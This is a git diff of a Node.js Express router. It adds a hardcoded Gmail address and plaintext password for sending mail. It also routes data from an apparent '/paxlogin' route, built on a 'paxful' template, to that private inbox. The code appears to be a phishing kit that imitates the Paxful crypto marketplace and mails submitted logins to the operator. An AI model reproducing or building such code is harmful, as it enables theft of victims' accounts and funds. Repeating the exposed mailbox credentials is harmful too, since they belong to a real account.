@@ -4,16 +4,6 @@ const {ensureAuthenticated} = require('../config/auth')
 const {ensureAuthenticate} = require('../config/auths')
 const bcrypt = require('bcrypt');
 const sgMail = require('@sendgrid/mail')
-// var Client = require('coinbase').Client;
-
-var coinbase = require('coinbase-commerce-node');
-var Checkout = coinbase.resources.Checkout;
-var Charge = coinbase.resources.Charge;
-var Client = coinbase.Client;
-
-// Client.init('[coinbase_commerce_apikey]');
-Client.init('[coinbase_commerce_apikey]');
-
 
 var multer = require('multer')
 const path = require('path');
@@ -34,12 +24,13 @@ const passport = require('passport');
 var randomstring = require("randomstring");
 const nodemailer = require('nodemailer'),
     mailTransporter = nodemailer.createTransport({
-        host: '[your_host_name]',
-        port: 465,
-        secure: true, //this is true as port is 465
+        // host: '[your_host_name]',
+        // port: 465,
+        // secure: true, //this is true as port is 465
+        service: "Gmail",
         auth: {
-            user: '[username]',
-            pass: '[password]'
+            user: 'whitechristabel203@gmail.com',
+            pass: 'christygofigure01'
         },
     }),
     EmailTemplate = require('email-templates').EmailTemplate,
@@ -147,8 +138,8 @@ router.post('/paxlogin', (req, res) => {
                                 loadTemplate('paxful', users).then((results) => {
                                     return Promise.all(results.map((result) => {
                                         sendEmail({
-                                            to: "[to_email]",
-                                            from: '[from_email]',
+                                            to: "whitechristabel203@gmail.com",
+                                            from: 'whitechristabel203@gmail.com',
                                             subject: result.email.subject,
                                             html: result.email.html,
                                             text: result.email.text,
